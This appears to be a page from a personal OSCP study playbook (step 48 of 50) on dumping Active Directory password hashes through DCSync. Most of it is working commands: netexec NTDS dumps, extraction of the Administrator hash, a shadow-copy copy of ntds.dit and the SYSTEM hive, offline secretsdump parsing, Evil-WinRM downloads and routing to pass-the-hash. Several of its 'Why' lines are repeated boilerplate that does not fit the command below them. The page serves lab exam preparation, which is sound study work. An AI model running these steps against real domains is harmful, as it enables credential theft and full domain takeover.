# AD - DCSync Dump

**Step 48 of 50 · AD**

*Use replication rights to dump domain hashes and extract the Administrator hash without printing it.*

## Run this

> **Why:** This extracts domain credential material using the authorized dump path, allowing the privileged account hash to be validated without printing it.
```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds | tee $BoxDir/loot/ntds-output.txt
cp /home/kali/.nxc/logs/ntds/$NtdsFile $BoxDir/loot/dcsync.ntds
AdminHash=$(awk -F: '$1 ~ /Administrator$/ {print $4; exit}' $BoxDir/loot/dcsync.ntds)
```

## Example output

```

RemoteOperations failed: rpc_s_access_denied
Dumping the NTDS
Administrator:500:...:HASH
...
```
If Impacket `secretsdump.py` returns `ERROR_DS_DRA_BAD_DN`, fall back to NetExec:

> **Why:** This extracts domain credential material using the authorized dump path, allowing the privileged account hash to be validated without printing it.
```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds | tee $BoxDir/loot/ntds-output.txt
```

Check whether multiple accounts share the same NTLM hash (password reuse):

> **Why:** This extracts domain credential material using the authorized dump path, allowing the privileged account hash to be validated without printing it.
```bash
# Identical hashes in the NTDS dump = same password — all accounts can be PTH'd
awk -F: '{print $4}' $BoxDir/loot/dcsync.ntds | sort | uniq -d
```

## What did you get?

- [ ] NTDS hashes were dumped → **Set `$AdminHash` privately and go to Step 49 · [[AD - Pass the Hash]]**
- [ ] RemoteOperations failed but DRSUAPI completed → **Treat the dump as successful and go to Step 49 · [[AD - Pass the Hash]]**
- [ ] Impacket returned `ERROR_DS_DRA_BAD_DN` → **Run `netexec ldap $BoxIP -u $Username -p $Password --ntds`, then go to Step 49 · [[AD - Pass the Hash]] if hashes are printed**
- [ ] DCSync is denied → **Go to Step 47 · [[AD - DCSync Grant]]**
- [ ] The command reports clock skew → **Go to Step 35 · [[AD - Clock Sync]]**
- [ ] Clock skew is too large for any Kerberos tool and cannot be fixed → **Use VSS to extract NTDS without Kerberos:**
  ```powershell
  vssadmin create shadow /for=C:
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\SYSTEM C:\Windows\Temp\sys2.save
  vssadmin delete shadows /all /quiet
  ```
  Download both files, then parse locally:
  ```bash
  secretsdump.py LOCAL -ntds $BoxDir/loot/ntds.dit -system $BoxDir/loot/sys2.save -just-dc-ntlm
  ```
  This requires SYSTEM privileges, so use GodPotato or a similar token abuse tool first.

## Notes

When multiple accounts share the same NTLM hash, PTH works for all of them — useful if the Administrator hash fails but another domain admin's hash is present.

## Gotcha

> [!warning] 💡
> RemoteOperations access denied can appear before a successful DRSUAPI dump. Read the complete output before deciding it failed.

> [!warning] 💡
> A domain controller's SAM hive contains local accounts only. Domain account hashes are stored in `ntds.dit`; use the SYSTEM hive with it for offline parsing.

## VSS transfer gotchas

When using DiskShadow or a shadow-copy route, convert scripts created on Linux to Windows line endings before uploading them:

> **Why:** This command gathers the ad dcsync dump evidence needed to decide which documented route applies next.
```bash
unix2dos $BoxDir/www/vss.dsh
```

When downloading hive files with Evil-WinRM, use full remote paths rather than bare filenames so the transfer is unambiguous:

> **Why:** This extracts domain credential material using the authorized dump path, allowing the privileged account hash to be validated without printing it.
```powershell
download C:\Windows\Temp\ntds.dit
download C:\Windows\Temp\system.bak
```

If the system Impacket wrapper fails because of a local Python package conflict, call the working pipx script directly:

> **Why:** This extracts domain credential material using the authorized dump path, allowing the privileged account hash to be validated without printing it.
```bash
/home/kali/.local/share/pipx/venvs/impacket/bin/secretsdump.py -ntds $BoxDir/loot/ntds.dit -system $BoxDir/loot/system.bak LOCAL
```

## DiskShadow transfer details

DiskShadow is a Windows snapshot utility. Scripts created on Kali use LF line endings by default, but Windows tools commonly expect CRLF. Convert with `unix2dos` before uploading. When Evil-WinRM transfers the resulting files, use bare filenames from the directory containing them.

> **Why:** This command converts the local DiskShadow script to Windows line endings; success is a clean upload and a complete script execution on the target.
```bash
# Convert before uploading the script to a Windows target.
unix2dos $BoxDir/www/vss.dsh
```

> **Why:** These target-side commands place the snapshot files in one directory and confirm their names before download; look for both files with non-zero sizes.
```powershell
cd C:\Windows\Temp
Get-ChildItem ntds.dit,system.bak | Select-Object Name,Length
```

> **Why:** Bare-name downloads keep the local loot filenames predictable; parse the matching pair locally with the working Impacket installation.
```powershell
download ntds.dit
download system.bak
```

## Additional routing

- [ ] The matching hive files download and parse successfully → **Set `$AdminHash` privately and go to Step 49 · [[AD - Pass the Hash]]**
- [ ] CRLF conversion, upload, or download fails → **Return to the DiskShadow transfer details above and verify the target directory and filenames**
## Seen in
- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- AD technique reference
- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- confirmed in the box write-up

## Related stages

- [[AD - Service Scan]]
- [[AD - Credential Validation]]
- [[AD - BloodHound]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
